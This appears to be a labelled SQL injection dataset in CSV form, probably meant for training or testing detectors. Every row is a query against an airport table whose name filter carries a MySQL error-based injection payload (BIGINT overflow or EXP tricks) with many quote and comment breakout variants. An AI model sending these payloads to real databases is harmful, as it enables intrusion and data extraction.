full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport%' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'TrTx%'='TrTx""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'tvUu' LIKE 'tvUu""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"") OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND (""wiqg""=""wiqg""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"")) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((""Qikn""=""Qikn""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND (((""HIqZ""=""HIqZ""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND ""AODd""=""AODd""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"") OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND (""QEup"" LIKE ""QEup""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"")) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((""WTur"" LIKE ""WTur""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND (((""hSxZ"" LIKE ""hSxZ""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND ""dtwr"" LIKE ""dtwr""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))) OR 'Kytq'='JNdD""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport') WHERE 2443=2443 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610)))-- OKJF""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"") WHERE 7743=7743 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610)))-- XCeP""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' WHERE 4092=4092 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610)))-- cyXd""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" WHERE 8081=8081 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610)))-- HESb""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport'||(SELECT 0x43634e6c WHERE 8608=8608 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))))||'""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport'||(SELECT 0x68627963 FROM DUAL WHERE 9687=9687 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))))||'""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport'+(SELECT 0x746a526c WHERE 6521=6521 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))))+'""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport||(SELECT 0x77434747 FROM DUAL WHERE 5024=5024 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))))||""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport||(SELECT 0x7443586d WHERE 7351=7351 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))))||""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport+(SELECT 0x6a454168 WHERE 3283=3283 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))))+""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport')) AS WKmE WHERE 2780=2780 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610)))-- wqbP""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"")) AS IOOF WHERE 4277=4277 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610)))-- Dunx""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport') AS Skji WHERE 6313=6313 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610)))-- jqza""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"") AS wKmE WHERE 3201=3201 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610)))-- ULNE""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""=""BucksAirport"" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND ""BucksAirport""=""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' IN BOOLEAN MODE) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610)))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610)))-- YZxj""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND (2796=2796""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport)) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((1998=1998""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND (((8755=8755""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610)))""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610)))-- glhm""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610)))# PmCS""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport) WHERE 1385=1385 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610)))-- foWv""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport WHERE 9823=9823 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610)))-- PMzM""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport+(SELECT wZSJ WHERE 1460=1460 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))))+""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport)) AS hfWn WHERE 4142=4142 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610)))-- wgbA""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport) AS IkRS WHERE 7458=7458 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610)))-- IgNs""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport` WHERE 6459=6459 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610)))-- PfnX""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport`) WHERE 2959=2959 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610)))-- jyIx""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport`=`BucksAirport` OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND `BucksAirport`=`BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport]-(SELECT 0 WHERE 8642=8642 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(6405=6405,1))),0x71626a6271,0x78))s), 8446744073709551610, 8446744073709551610))))|[BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))-- XOVF""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))-- LBca""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))-- NkLH""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND ('udvH'='udvH""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport')) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND (('puTW'='puTW""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport'))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND ((('rfyJ'='rfyJ""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND 'yDRb'='yDRb""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND ('ANRE' LIKE 'ANRE""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport')) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND (('vGOy' LIKE 'vGOy""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport'))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND ((('Ubdg' LIKE 'Ubdg""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport%' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND 'dMdB%'='dMdB""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND 'Xmjr' LIKE 'Xmjr""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"") AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND (""XuXy""=""XuXy""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"")) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND ((""oUjm""=""oUjm""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND (((""OHHL""=""OHHL""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND ""mGUA""=""mGUA""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"") AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND (""ZXTo"" LIKE ""ZXTo""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"")) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND ((""YfVH"" LIKE ""YfVH""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND (((""hpyI"" LIKE ""hpyI""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND ""ueCH"" LIKE ""ueCH""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) OR 'UEaY'='czyk""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport') WHERE 4549=4549 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))-- ETaK""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"") WHERE 8646=8646 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))-- FzCU""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' WHERE 2356=2356 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))-- boYW""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"" WHERE 9104=9104 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))-- wiph""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport'||(SELECT 0x7a724447 WHERE 7800=7800 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)))||'""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport'||(SELECT 0x4b444467 FROM DUAL WHERE 4723=4723 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)))||'""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport'+(SELECT 0x437a4c76 WHERE 4044=4044 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)))+'""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport||(SELECT 0x576b644e FROM DUAL WHERE 9093=9093 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)))||""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport||(SELECT 0x55546a46 WHERE 1913=1913 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)))||""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport+(SELECT 0x4d594e48 WHERE 3166=3166 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)))+""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport')) AS AzjE WHERE 8191=8191 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))-- YPgp""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"")) AS rOkT WHERE 1132=1132 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))-- ZtFq""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport') AS siEs WHERE 4719=4719 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))-- bgGa""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"") AS pXeH WHERE 2391=2391 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))-- NLei""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport""=""BucksAirport"" AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND ""BucksAirport""=""BucksAirport""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport' IN BOOLEAN MODE) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))-- kqbB""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND (4316=4316""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport)) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND ((5401=5401""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport))) AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x)) AND (((7530=7530""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))-- vVIt""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))# mZxx""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport) WHERE 8265=8265 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171626271,(SELECT (ELT(7192=7192,1))),0x71626a6271,0x78))x))-- JSMB""",1,airport-S3,Unknown,Unknown
